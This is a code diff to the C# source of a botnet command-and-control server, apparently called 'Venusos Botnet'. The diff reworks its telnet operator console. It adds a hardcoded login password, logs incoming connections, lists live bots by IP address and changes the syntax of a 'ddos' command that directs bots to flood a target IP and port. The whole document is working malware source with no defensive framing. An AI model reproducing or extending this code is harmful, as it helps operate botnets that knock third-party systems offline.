@@ -1,4 +1,6 @@
-﻿using System.Net.Sockets;
+﻿using System.Diagnostics;
+using System.Net;
+using System.Net.Sockets;
 using System.Text;
 using System.Text.Json;
 
@@ -8,6 +10,11 @@ namespace Venusos_Botnet_Server
     {
         public static void StartListener()
         {
+            Console.WriteLine("Telnet console is avaiable on {0}:23\n\r", Tools.GetLocalIP());
+
+            bool logged = false;
+            bool just_logged = false;
+
             while (true)
             {
                 TcpListener tcpListener = new TcpListener(Tools.GetLocalIP(), 23);
@@ -15,26 +22,46 @@ namespace Venusos_Botnet_Server
 
                 try
                 {
-                    byte[] bytes = new byte[256];
+                    int i;
                     string data;
+                    byte[] bytes = new byte[256];
 
-                    while (true)
+                    TcpClient tcpClient = tcpListener.AcceptTcpClient();
+                    NetworkStream networkStream = tcpClient.GetStream();
+
+                    Console.WriteLine("New connection request from {0}", ((IPEndPoint)tcpClient.Client.RemoteEndPoint).Address);
+
+                    networkStream.Write(Encoding.ASCII.GetBytes("Enter password: "));
+
+                    Stopwatch timer = new Stopwatch();
+                    timer.Start();
+
+                    while ((i = networkStream.Read(bytes)) != 0)
                     {
-                        Console.Write("Telnet console is avaiable on {0}:23\n\r", Tools.GetLocalIP());
+                        data = Encoding.ASCII.GetString(bytes, 0, i);
 
-                        TcpClient tcpClient = tcpListener.AcceptTcpClient();
-                        NetworkStream networkStream = tcpClient.GetStream();
-
-                        int i;
-                        data = null;
-
-
-                        networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
-
-
-                        while ((i = networkStream.Read(bytes)) != 0)
+                        if (!logged)
                         {
-                            data = Encoding.ASCII.GetString(bytes, 0, i);
+                            Console.WriteLine(data);
+                            if (data is "test")
+                            {
+                                logged = true;
+                                just_logged = true;
+                            }
+                            if (timer.Elapsed.TotalSeconds > 10)
+                            {
+                                tcpClient.Close();
+                                throw new Exception("Wrong password");
+                            }
+                        }
+                        else
+                        {
+                            if (just_logged)
+                            {
+                                networkStream.Write(Encoding.ASCII.GetBytes("Hello, type help to get more info!\n\r"));
+                                just_logged = false;
+                            }
+
                             BotsServer.tcpClients.RemoveAll(x => !x.Connected);
 
                             if (data.StartsWith("help"))
@@ -51,7 +78,7 @@ namespace Venusos_Botnet_Server
                                     if (BotsServer.Ping(bot))
                                     {
                                         alive++;
-                                        networkStream.Write(Encoding.ASCII.GetBytes(bot.Client.RemoteEndPoint.AddressFamily + " is alive\n\r"));
+                                        networkStream.Write(Encoding.ASCII.GetBytes(((IPEndPoint)bot.Client.RemoteEndPoint).Address + " is alive\n\r"));
                                     }
                                 }
                                 networkStream.Write(Encoding.ASCII.GetBytes(alive + " bots are alive out of " + all + "\n\r"));
@@ -75,17 +102,11 @@ namespace Venusos_Botnet_Server
                                 }
                                 else
                                 {
-                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP] [PORT] [DURATION] [CPU USAGE (%)]\n\r"));
+                                    networkStream.Write(Encoding.ASCII.GetBytes("ddos [METHOD] [IP] [PORT] [DURATION] [THREADS]\n\r"));
                                 }
                             }
-
                         }
-
                     }
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine("Exception: {0}", e);
                 }
                 finally
                 {
